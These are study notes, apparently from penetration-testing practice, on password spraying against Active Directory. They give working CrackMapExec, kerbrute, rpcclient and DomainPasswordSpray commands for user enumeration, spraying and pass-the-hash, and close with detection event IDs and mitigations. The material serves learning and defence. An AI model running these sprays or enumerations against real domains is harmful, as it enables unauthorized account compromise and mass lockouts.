# AD Password Spraying — Study Notes

Personal notes from practicing internal AD password spraying.

---

## What spraying is

Brute force = one user, many passwords.
Password spray = one common password, many users.

Lockout policies are built around the first pattern. If the threshold is 5 and you throw 20 passwords at a single mailbox, you lock it. If you try one seasonal/weak password once across a few hundred accounts, each account only burned one failure.

That is why spraying still works in places that "already have lockout enabled." The policy slows down guessing against one person. It does not stop a bad password that showed up in a lot of mailboxes.

---

## Order of operations

1. Read the domain password policy.
2. Build a list of valid users.
3. Drop accounts already close to lockout (`badPwdCount`).
4. Spray **one** password. Stay under the threshold.
5. If nothing hits, wait for the observation / reset window, then try a different password.

Do not spray before you know the threshold. That is how you become the incident.

---

## Reading the policy

### Linux, already have a domain account

```bash
crackmapexec smb <DC> -u <user> -p <pass> --pass-pol
```

Things I actually care about in the output:

- minimum length
- complexity on/off
- lockout threshold
- lockout duration
- reset lockout counter (observation window)

Complexity being on does not mean people pick strong passwords. `Welcome1` and `Winter2022` both satisfy "upper + lower + digit" and they are still junk.

### Linux, no creds

Older domains sometimes still allow an SMB NULL session or LDAP anonymous bind. Usually leftover from an old DC that got upgraded in place.

```bash
rpcclient -U "" -N <DC>
querydominfo
getdompwinfo
```

```bash
enum4linux -P <DC>
enum4linux-ng -P <DC> -oA policy
```

```bash
ldapsearch -H ldap://<DC> -x -b "DC=example,DC=local" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

Newer `ldapsearch` wants `-H ldap://...`, not `-h`.

### Windows

Null session:

```cmd
net use \\DC01\ipc$ "" /u:""
```

Already domain-joined:

```cmd
net accounts
```

Or PowerView:

```powershell
Import-Module .\PowerView.ps1
Get-DomainPolicy
```

`net accounts` is what you use when you cannot drop tools.

Useful `net use` errors:

- 1331 = account disabled
- 1909 = account locked

---

## A mistake I had in my first notes

I wrote that I should hit the same user 3–4 times, then wait for the reset window. That is not spraying. That is slow brute force, and with a threshold of 5 you are one extra failure from locking people out.

Correct loop:

- one password across the whole list
- one attempt per user
- wait the full reset window before the next password
- remove anyone whose `badPwdCount` is already threshold minus 1 or 2

If unlock is manual on the client side, a lockout wave is worse than a missed spray.

---

## Building a user list

Garbage in, garbage out. If the file still has timestamps and `[+] VALID USERNAME:` prefixes, every tool will authenticate as the whole line and you will think the password is wrong.

| Method | When I use it |
|---|---|
| SMB NULL + `enum4linux -U` / `rpcclient enumdomusers` | Null session works |
| LDAP anonymous + `ldapsearch` / `windapsearch` | Port 389 allows anon |
| `kerbrute userenum` + a likely-username wordlist | No null session, only port 88 |
| CME `--users` with creds | Best list, includes `badPwdCount` |
| DomainPasswordSpray on a domain-joined box | Session is already domain-auth'd |

```bash
enum4linux -U <DC> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

rpcclient -U "" -N <DC>
# enumdomusers

ldapsearch -H ldap://<DC> -x -b "DC=example,DC=local" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "

python3 windapsearch.py --dc-ip <DC> -u "" -U

kerbrute userenum -d example.local --dc <DC> usernames.txt
```

Strip kerbrute output. Do not spray the log file:

```bash
grep -oP 'VALID USERNAME:\s+\K\S+' kerb.out | cut -d@ -f1 | sort -u > valid_users.txt
```

```bash
crackmapexec smb <DC> -u <user> -p <pass> --users
```

`--users` is for more than names. It shows who is already close to lockout.

---

## Spraying from Linux

### rpcclient

Success is not a nice banner. You grep for `Authority` after `getusername`.

```bash
for u in $(cat valid_users.txt); do
  rpcclient -U "$u%<Password>" -c "getusername;quit" <DC> | grep Authority && echo "OK $u"
done
```

### kerbrute

```bash
kerbrute passwordspray -d example.local --dc <DC> valid_users.txt <Password>
```

Talks to port 88 so it is fast. `KDC_ERR_ETYPE_NOSUPP` on some accounts is an encryption-type mismatch, not automatically a wrong password.

### CrackMapExec / NetExec

This is a domain spray. Do not add `--local-auth` unless you mean local SAM.

```bash
crackmapexec smb <DC> -u valid_users.txt -p '<Password>' --continue-on-success
```

`--continue-on-success` keeps going after the first valid pair. Without it the tool can stop early.

---

## Things that wasted time

1. `--local-auth` against the DC. That is the local SAM, not domain users.
2. Spraying a dirty user file full of kerbrute log lines.
3. Spraying a whole subnet when the point was one DC.
4. A "cleaned" list that was missing most of the valid names.

Fix: policy, clean usernames only, spray the DC, no `--local-auth`.

---

## Spraying from Windows

`DomainPasswordSpray` is the usual choice on a domain-joined box.

If the session is already a domain user, skip `-UserList`. The tool will:

- LDAP-search the current domain
- pull `sAMAccountName`
- read lockout policy
- read `badPwdCount` / `lockoutTime`
- drop accounts one failure away from lockout
- spray the password you gave it

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password <Password> -OutFile spray_success.txt -ErrorAction SilentlyContinue
```

The list is not generated from thin air. The box already knows the DC, and the current token can query AD.

If you are on Windows but not domain-authenticated, you have to pass a user file.

---

## Local admin reuse is a different attack

Gold images often leave the same local administrator hash on every workstation. That spray hits SAM, not AD.

Use `--local-auth` there so the attempt does not go to the DC and lock a domain account.

```bash
crackmapexec smb --local-auth <subnet> -u administrator -H <NTHASH>
```

---

## Tools and why

- **CrackMapExec / nxc** — policy, users, spray, PTH, one binary. Easy to grep `[+]`.
- **rpcclient** — already on most Linux boxes. Null sessions and a cheap spray.
- **enum4linux / enum4linux-ng** — RPC/SMB wrapper. ng if you want JSON later.
- **ldapsearch / windapsearch** — anonymous 389. windapsearch saves writing filters by hand.
- **kerbrute** — enum + spray on 88 when SMB is noisy or blocked.
- **net.exe / PowerView** — Windows foothold, no uploads.
- **DomainPasswordSpray** — list + policy + lockout avoidance from inside the domain.

Pick based on creds vs no creds, Windows vs Linux, and whether you have 445, 389, or 88.

---

## Detection

From the outside it looks like a burst of lockouts or a pile of failures from one source.

On the DC:

| Event | Meaning |
|---|---|
| 4625 | failed logon (common with SMB/NTLM) |
| 4771 / 0x18 | Kerberos pre-auth failed, bad password |
| 4776 | NTLM auth failed |
| 4624 after a failure burst | that account worked |
| 4740 | lockout |
| 2889 | unsigned LDAP bind, if they sprayed LDAP |

If the spray goes after LDAP instead of SMB, **4625 may never show up**. Watching only 4625 is how this gets missed. Watch 4771 too.

On the Windows box that ran the spray:

- **4648** — logon attempted with explicit credentials that are not the current session. A PowerShell spray leaves a stack of these from one host and one process.

Before the spray, DomainPasswordSpray queries LDAP for `badpwdcount` and `lockouttime`. That enumeration is visible if LDAP diagnostics or MDI are on.

Forgot password vs spray:

- user typo: one account, repeats, their workstation
- spray: many accounts, one try each, same source, same few minutes

Alert thresholds vary. Roughly:

- AD lockout itself is often 5–10
- spray detections are more like many distinct users failing from one source in a short window
- a honeypot account is better than any magic number. One failure against it is enough.

---

## Mitigations that actually help

Lockout alone does not kill spraying. It only rate-limits brute force.

- MFA on VPN / OWA / RDP / SSO
- banned password list for seasonal and company-name passwords
- length over 8; complexity at 8 still lets `Welcome1` through
- disable NULL sessions and anonymous LDAP
- do not leave privileged accounts exposed to SMB auth from every workstation
- log 4625 **and** 4771, correlate on source
- honeypot users
- LAPS or equivalent so local admin is not reused
- passwordless / WHfB where the environment can support it

What does not fix this: complexity rules by themselves, or dropping lockout to 3. The second one is a self-DoS.
